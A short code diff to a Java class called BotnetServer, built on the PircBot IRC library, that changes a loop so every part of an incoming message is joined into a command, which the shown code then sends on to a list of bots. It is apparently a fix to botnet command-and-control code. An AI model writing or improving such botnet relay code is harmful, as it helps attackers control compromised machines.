@@ -291,7 +291,7 @@ public class BotnetServer extends PircBot {
 						}
 					}
 					String command = parts[0];
-					for (int i = 2; i <= 5; i++) {
+					for (int i = 2; i < parts.length; i++) {
 						command += " " + parts[i];
 					}
 					for (String name : bots) {
